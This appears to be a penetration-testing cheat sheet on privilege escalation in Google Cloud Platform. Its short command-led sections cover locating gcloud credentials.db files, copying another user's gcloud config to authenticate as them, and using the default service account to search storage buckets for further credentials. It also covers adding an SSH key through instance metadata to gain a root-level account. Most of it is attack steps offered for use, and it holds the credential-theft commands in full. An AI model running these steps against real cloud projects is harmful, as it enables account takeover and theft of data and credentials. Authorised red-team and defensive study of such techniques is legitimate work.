# Privilege Escalation
- Google Cloud Platform has 2 user types
  - User Accounts 
    - Traditional user access with password 
  - Service Accounts 
    - Don’t have passwords 
    - Every GCP project has a “Default” service account
    - Default will get bound to instances if no other is set
    - EVERY process running on the instance can authenticate as the service account
- Got shell on a compute instance?
- The default service account can access EVERY storage bucket in a project

## Execute commands on vm's
- Can connect with gcloud ssh command, command can be retrieved from the portal in VM instances, remote access --> View gcloud command, looks like:
```
gcloud beta compute ssh --zone "us-east1-b" "test-instance-1" --project "test-gcloud-project"
```

## Getting credentials
#### Look for Gcloud credentials
- Gcloud stores creds in ~/.config/gcloud/credentials.db
```
sudo find /home -name "credentials.db
```

### Auth as compromised user
- Copy gcloud dir to your own home directory to auth as the compromised user
```bash
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list
```

## Bucket access
#### Check if user has default service account access
- Look for the standard default service account name that look like: 
  - PROJECT_NUMBER-compute@developer.gserviceaccount.com
  - PROJECT_ID@appspot.gserviceaccount.com
- Use service account to access buckets looking for other creds or sensitive data
```
gcloud config list
```

## Metadata server
- Metadata  endpoint on instances at 169.254.169.254
- Any public SSH keys in the metadata server get an account with root access setup
- If you can set a public key on the metadata server it will setup a brand new Linux account for you on the instance
- Need default perms set to “full access to Cloud APIs” or compute API access
  - Or… custom IAM perms: 
    - compute.instances.setMetadata
    - compute.projects.setCommonInstanceMetadata

### Create SSH key for a new username
```
ssh-keygen -t rsa -C "<USER>" -f ./<FILENAME>.key -P ""
```

#### Copy the username and key data into a file called metadata.txt in the following format:
```
<USERNAME>:<public key data in usernamekey.pub>
```

#### Update the instance metadata
```
gcloud compute instances add-metadata <instance name> --metadata-from-file ssh-keys=metadata.txt
```

- Now when the daemon runs it will add a new user with root privileges. Use your newly generated SSH key to SSH in.
